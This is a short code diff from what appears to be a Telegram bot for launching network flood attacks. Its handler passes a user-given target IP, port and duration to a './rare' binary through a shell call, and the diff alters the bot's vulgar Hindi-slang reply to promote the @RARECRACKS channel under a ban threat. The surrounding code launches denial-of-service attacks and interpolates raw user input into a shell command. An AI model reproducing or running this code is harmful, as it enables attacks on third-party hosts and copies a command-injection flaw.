@@ -239,7 +239,8 @@ def handle_rare(message):
                     start_attack_reply(message, target, port, time_amount)
                     full_command = f"./rare {target} {port} {time_amount} 70"
                     subprocess.run(full_command, shell=True)
-                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐇𝐀𝐓𝐀𝐌🎮\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time_amount} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵"
+                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐇𝐀𝐓𝐀𝐌🎮\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time_amount} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵 𝗝𝗢𝗜𝗡 𝗢𝗧𝗛𝗘𝗥𝗪𝗜𝗦𝗘 𝗕𝗔𝗡 =
+@RARECRACKS "
             except ValueError:
                 response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
         else:
